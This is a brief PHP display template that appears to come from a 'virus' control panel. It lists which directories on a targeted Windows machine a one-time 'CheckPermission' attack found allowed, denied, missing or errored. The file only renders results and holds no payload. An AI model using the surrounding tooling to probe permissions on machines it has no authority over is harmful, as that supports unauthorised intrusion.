<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\CheckPermission\CheckPermission;
use function Kelvinho\Virus\map;

/** @var CheckPermission $attack */

function render($directories) {
    echo "<div style='white-space: pre; font-family: monospace, monospace; background-color: var(--surface)'>";
    (count($directories) == 0) ? print("(No directories)") : map($directories, fn($directory) => print($directory["path"]));
    echo "</div>";
}

?>
<p>Allowed directories:</p>
<?php render($attack->getDirectories(CheckPermission::PERMISSION_ALLOWED)); ?>
<p>Not allowed directories:</p>
<?php render($attack->getDirectories(CheckPermission::PERMISSION_NOT_ALLOWED)); ?>
<p>Directories that does not exist:</p>
<?php render($attack->getDirectories(CheckPermission::PERMISSION_DOES_NOT_EXIST)); ?>
<p>Something has gone wrong with these directories:</p>
<?php render($attack->getDirectories(CheckPermission::PERMISSION_UNSET)); ?>

